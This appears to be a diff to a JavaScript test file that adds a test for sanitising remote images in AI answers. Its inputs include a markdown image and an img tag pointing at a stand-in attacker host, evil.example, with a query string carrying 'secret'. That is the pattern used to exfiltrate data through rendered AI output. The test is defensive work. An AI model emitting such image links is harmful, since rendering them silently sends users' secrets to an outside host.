@@ -74,6 +74,12 @@ describe('text helpers', () => {
     assert.equal(ai.stripNoiseFromDiff(diff), 'diff --git a/src/a.js b/src/a.js\n+y\n');
   });
 
+  test('remote images in AI answers become plain links', () => {
+    assert.equal(ai.stripRemoteImages('see ![x](https://evil.example/?d=secret) now'), 'see [x](https://evil.example/?d=secret) now');
+    assert.equal(ai.stripRemoteImages('a <img src="https://evil.example/p.png"> b'), 'a  b');
+    assert.equal(ai.stripRemoteImages('keep [link](https://example.com) and `code`'), 'keep [link](https://example.com) and `code`');
+  });
+
   test('truncation and env scrubbing are shared with the providers', () => {
     assert.equal(ai.truncateContext('abcdef', 2).truncated, true);
     assert.deepEqual(ai.scrubEnv({ A: '1', CLAUDECODE: '1', CLAUDE_CODE_EXTRA_BODY: '{}' }), { A: '1' });
